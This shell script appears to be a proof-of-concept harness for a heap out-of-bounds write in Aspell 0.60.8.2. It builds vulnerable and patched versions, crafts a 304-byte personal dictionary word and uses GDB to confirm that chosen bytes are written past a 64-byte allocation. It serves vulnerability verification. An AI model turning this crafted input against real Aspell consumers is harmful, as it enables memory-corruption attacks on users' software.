#!/bin/sh
# CVE-2026-75820: a chosen byte sequence at consecutive OOB offsets in a real
# Aspell 0.60.8.2 consumer. The 300-byte personal word has wrapped size byte
# 48 at writable.cpp:517; the near miss keeps the full byte pattern, so
# Working::fine_tune_score (suggest.cpp:1483-1485) copies chosen letters,
# normalized to class codes 1..26, past the String allocated at :1469.
#
# Same build recipe and controls as 75820-write-probe.sh. Usage:
#   sh harness/75820-pattern-sweep.sh [evidence-dir] [work-dir]
# Optional STORE_ADDR (default 0x5555557d0fac) is the `mov %r12b,(%r14)`
# instruction in the recover-ASan build; see REPLAY.txt for the build id.
set -u
base="$(cd "$(dirname "$0")/.." && pwd)"
rb="$base/real-build"
out="${1:-$base/harness/evidence/75820-pattern-sweep}"
work="${2:-/tmp/aspell-pattern-sweep-work}"
out="$(mkdir -p "$out" && cd "$out" && pwd)"
work="$(mkdir -p "$work" && cd "$work" && pwd)"
dict="$rb/en-install/dict"
data="$rb/en-install/data"
store="${STORE_ADDR:-0x5555557d0fac}"
cflags='-fsanitize=address -fsanitize-recover=address -fno-omit-frame-pointer -g -O1 -DNDEBUG'
export ASAN_OPTIONS=detect_leaks=0:halt_on_error=0:abort_on_error=0

build() {
  name="$1"; src="$2"
  if [ ! -x "$work/build-$name/aspell" ]; then
    [ -d "$src" ] || { echo "missing source $src; see 75820-write/REPLAY.txt" >&2; return 1; }
    rm -rf "$work/src-$name" "$work/build-$name"
    cp -a "$src" "$work/src-$name"
    mkdir -p "$work/build-$name"
    ( cd "$work/build-$name" && ../src-$name/configure --disable-shared \
        CC=clang CXX=clang++ CFLAGS="$cflags" CXXFLAGS="$cflags" \
        LDFLAGS=-fsanitize=address > configure.out 2>&1 \
      && make -j4 > make.out 2>&1 ) || return 1
  fi
}
build vuln "$rb/aspell-0.60.8.2" || exit 1
build fixed "$rb/aspell-0.60.8.3" || exit 1
build targeted "$rb/aspell-0.60.8.2-targeted-fix" || exit 1

# 44-byte alphabet pattern repeated; total 304 bytes wraps to size byte 48.
p44='abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqr'
body="${p44}${p44}${p44}${p44}${p44}${p44}abcdefghijklmnopqrstuvwxyzabcdefghijklmn"
[ "${#body}" -eq 304 ] || { echo "bad body length ${#body}" >&2; exit 1; }
printf 'personal_ws-1.1 en 1 utf-8\n%s\n' "$body" > "$out/personal-pattern"
query="${body%?}s"
printf '%s\n' "$query" > "$out/query-pattern"

# Plain recover-ASan run: first ASan WRITE must be just past a 64-byte String.
"$work/build-vuln/aspell" --lang=en --dont-validate-words \
  --dict-dir="$dict" --data-dir="$data" --personal="$out/personal-pattern" \
  -a < "$out/query-pattern" > "$out/vuln.out" 2>&1 || true

# GDB logs 40 consecutive stores, the destination bytes before and after.
cat > "$out/gdb.cmd" <<EOF
set pagination off
set confirm off
set \$n = 0
set \$dest = 0
break *$store
commands
silent
set \$n = \$n + 1
if \$n == 1
  set \$dest = \$r14
  printf "BEFORE\n"
  x/40bx \$dest
end
if \$n <= 41
  printf "HIT %d dest=%p raw=%c norm=%d\n", \$n, \$r14, \$rcx, \$r12
end
if \$n == 41
  printf "AFTER41\n"
  x/40bx \$dest
end
continue
end
run --lang=en --dont-validate-words --dict-dir=$dict --data-dir=$data --personal=$out/personal-pattern -a < $out/query-pattern
quit
EOF
gdb -batch -x "$out/gdb.cmd" "$work/build-vuln/aspell" > "$out/gdb.out" 2>&1 || true


# Deterministic assertions; any failure exits non-zero.
fail=0
check() { grep -q "$1" "$out/summary.txt" || { echo "FAIL: $1" >&2; fail=1; }; }
: > "$out/summary.txt"
writes="$(grep -c 'WRITE of size 1' "$out/vuln.out" || true)"
hits="$(grep -c '^HIT ' "$out/gdb.out" || true)"
printf 'plain_writes=%s first_write_region=%s gdb_hits=%s\n' \
  "$writes" "$(grep 'located .* after 64-byte region' "$out/vuln.out" | head -1)" \
  "$hits" >> "$out/summary.txt"
grep '^HIT ' "$out/gdb.out" | sed -n '1,26p' \
  | sed -E 's/.*raw=(.) norm=([0-9]+)/\1:\2/' | tr '\n' ' ' \
  >> "$out/summary.txt"; printf '\n' >> "$out/summary.txt"
grep -A5 '^AFTER41' "$out/gdb.out" >> "$out/summary.txt"
for name in fixed targeted; do
  "$work/build-$name/aspell" --lang=en --dont-validate-words \
    --dict-dir="$dict" --data-dir="$data" --personal="$out/personal-pattern" \
    -a < "$out/query-pattern" > "$out/$name.out" 2>&1
  rc=$?
  printf '%s rc=%s asan=%s write=%s\n' "$name" "$rc" \
    "$(grep -c 'ERROR: AddressSanitizer' "$out/$name.out" || true)" \
    "$(grep -c 'WRITE of size' "$out/$name.out" || true)" >> "$out/summary.txt"
done
check 'plain_writes=[2-9]'
check '0 bytes after 64-byte region'
check 'gdb_hits=41'
check 'a:1 b:2 c:3 d:4 e:5 f:6 g:7 h:8 i:9 j:10 k:11 l:12 m:13 n:14 o:15 p:16 q:17 r:18 s:19 t:20 u:21 v:22 w:23 x:24 y:25 z:26'
check '0x01.*0x02.*0x03.*0x04.*0x05.*0x06.*0x07.*0x08'
check '0x19.*0x1a.*0x01.*0x02.*0x03.*0x04.*0x05.*0x06'
check 'fixed rc=1 asan=0 write=0'
check 'targeted rc=1 asan=0 write=0'
[ "$fail" -eq 0 ] && echo '8 PASS / 0 FAIL' | tee -a "$out/summary.txt"
exit "$fail"
